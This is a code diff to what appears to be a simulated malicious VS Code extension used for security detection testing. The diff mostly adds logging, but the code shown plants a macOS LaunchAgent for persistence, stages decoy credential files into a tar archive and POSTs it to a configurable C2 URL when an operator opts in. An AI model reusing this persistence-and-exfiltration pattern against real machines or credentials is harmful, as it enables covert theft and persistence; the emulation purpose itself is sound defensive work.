@@ -15,8 +15,13 @@
 //             directory (derived from os.homedir(); that location is the
 //             persistence signal) and loads it with launchctl bootstrap into
 //             the user's gui domain. Its program is /usr/bin/true (a no-op),
-//             the label carries the canary string, and scenario cleanup
-//             boots it out and deletes it.
+//             and scenario cleanup boots it out and deletes it. The launchd
+//             label is exactly: com.cortexsim.CORTEXSIM-CANARY.koi009
+//             (plist: ~/Library/LaunchAgents/com.cortexsim.CORTEXSIM-CANARY.koi009.plist).
+//
+// Diagnostics: everything is logged through note() to the "CortexSim KOI-009"
+// output channel (and console.error). A step that did nothing reads
+// differently from one that worked.
 //   /step-05  reads the DECOY credential-named files (CORTEXSIM-DECOY values)
 //             and copies them into a staging directory in the decoy tree.
 //   /step-06  archives the staging directory; sends it only if
@@ -40,8 +45,12 @@ function decoyRoot() {
     return (process.env && process.env.CORTEXSIM_KOI009_DECOY_ROOT) || "";
 }
 
+let channel = null;
+
 function note(msg) {
-    console.error(MARKER + " prettier-pro-canary: " + msg);
+    const line = MARKER + " prettier-pro-canary: " + msg;
+    console.error(line);
+    try { if (channel) channel.appendLine(line); } catch (_) { /* ignore */ }
 }
 
 function writeMarker(root, name, body) {
@@ -51,9 +60,19 @@ function writeMarker(root, name, body) {
 
 function run(cmd, args) {
     // Child of the extension host; short-lived and exits on its own.
+    const text = cmd + " " + args.join(" ");
     try {
-        cp.execFile(cmd, args, () => {});
-    } catch (_) { /* ignore */ }
+        cp.execFile(cmd, args, (err, stdout, stderr) => {
+            if (err) {
+                note("FAILED " + text + " exit=" + (err.code === undefined ? "n/a" : err.code) +
+                    " stderr=" + String(stderr || err.message).trim());
+            } else {
+                note("ok " + text);
+            }
+        });
+    } catch (e) {
+        note("FAILED to spawn " + text + ": " + (e && e.message));
+    }
 }
 
 function step03(root) {
@@ -63,7 +82,7 @@ function step03(root) {
 
 function step04() {
     const dir = path.join(os.homedir(), "Library", "LaunchAgents");
-    const label = "com.cortexsim.canary.koi009";
+    const label = "com.cortexsim.CORTEXSIM-CANARY.koi009";
     const plist = path.join(dir, label + ".plist");
     fs.mkdirSync(dir, { recursive: true });
     fs.writeFileSync(plist, [
@@ -89,38 +108,53 @@ function step05(root) {
     const staging = stagingDir(root);
     fs.mkdirSync(staging, { recursive: true });
     let names = [];
-    try { names = fs.readdirSync(credDir); } catch (_) { /* nothing planted */ }
+    try {
+        names = fs.readdirSync(credDir);
+    } catch (e) {
+        note("step-05 NOTHING STAGED: cannot read " + credDir + ": " + (e && e.message));
+    }
     for (const name of names) {
         try {
             const data = fs.readFileSync(path.join(credDir, name), "utf8");
             fs.writeFileSync(path.join(staging, name), data);
-        } catch (_) { /* ignore */ }
+            note("step-05 staged " + name);
+        } catch (e) {
+            note("step-05 FAILED to stage " + path.join(credDir, name) + ": " + (e && e.message));
+        }
     }
     writeMarker(staging, "staged.marker", "decoy staging");
 }
 
 function step06(root) {
     const archive = path.join(root, "staging.tgz");
-    cp.execFile("tar", ["-czf", archive, "-C", stagingDir(root), "."], (err) => {
-        if (err) return;
-        const c2 = (process.env && process.env.CORTEXSIM_C2_URL) || "";
-        if (!c2) {
-            note("step-06 C2 url unset; would target " + CANARY_HOST + "; nothing sent.");
+    cp.execFile("tar", ["-czf", archive, "-C", stagingDir(root), "."], (err, stdout, stderr) => {
+        if (err) {
+            note("step-06 FAILED tar " + archive + ": " + String(stderr || err.message).trim());
             return;
         }
-        // Actual egress shape; runs only with explicit operator opt-in.
-        const url = new URL(c2);
-        const proto = url.protocol === "https:" ? require("https") : require("http");
-        const req = proto.request({
-            hostname: url.hostname,
-            port: url.port || (url.protocol === "https:" ? 443 : 80),
-            path: url.pathname + url.search,
-            method: "POST",
-            headers: { "x-cortexsim-canary": "vscode-prettier-pro-canary" },
-        }, () => {});
-        req.on("error", () => {});
-        req.write(MARKER + "\n" + fs.readFileSync(archive).toString("latin1"));
-        req.end();
+        try {
+            const c2 = (process.env && process.env.CORTEXSIM_C2_URL) || "";
+            if (!c2) {
+                note("step-06 archived " + archive + "; C2 url unset; would target " + CANARY_HOST + "; nothing sent.");
+                return;
+            }
+            // Actual egress shape; runs only with explicit operator opt-in.
+            const url = new URL(c2);
+            const proto = url.protocol === "https:" ? require("https") : require("http");
+            const body = MARKER + "\n" + fs.readFileSync(archive).toString("latin1");
+            const req = proto.request({
+                hostname: url.hostname,
+                port: url.port || (url.protocol === "https:" ? 443 : 80),
+                path: url.pathname + url.search,
+                method: "POST",
+                headers: { "x-cortexsim-canary": "vscode-prettier-pro-canary" },
+            }, (res) => { note("step-06 sent " + archive + " status=" + res.statusCode); });
+            req.on("error", (e) => note("step-06 send FAILED for " + archive + ": " + (e && e.message)));
+            req.write(body);
+            req.end();
+        } catch (e) {
+            note("step-06 FAILED for " + archive + ": " + (e && e.message));
+        }
     });
 }
 
@@ -151,6 +185,8 @@ function handleUri(uri) {
 }
 
 function activate(context) {
+    channel = vscode.window.createOutputChannel("CortexSim KOI-009");
+    context.subscriptions.push(channel);
     const root = decoyRoot();
     if (root) {
         writeMarker(root, "activated.marker", "step-02");
